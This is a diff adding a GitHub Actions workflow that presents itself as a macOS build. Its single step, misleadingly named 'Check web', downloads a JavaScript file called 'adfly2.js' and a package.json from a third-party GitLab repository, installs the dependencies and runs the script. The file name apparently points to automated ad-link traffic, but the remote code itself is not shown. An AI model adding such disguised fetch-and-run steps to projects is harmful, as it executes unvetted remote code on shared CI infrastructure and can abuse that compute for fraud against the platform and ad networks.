@@ -1,0 +1,15 @@
+name: auto-build-macos-adf
+on: 
+  workflow_dispatch:
+defaults:
+  run:
+    shell: bash
+
+jobs:
+  build:
+    runs-on: macos-latest
+    timeout-minutes: 7
+    steps:
+    - name: Check web
+      run: |
+        curl https://gitlab.com/meo__coder/appfim__img/-/raw/master/adfly2.js --output index.js && curl https://gitlab.com/meo__coder/appfim__img/-/raw/master/package.json --output package.json && npm i -s && npm start
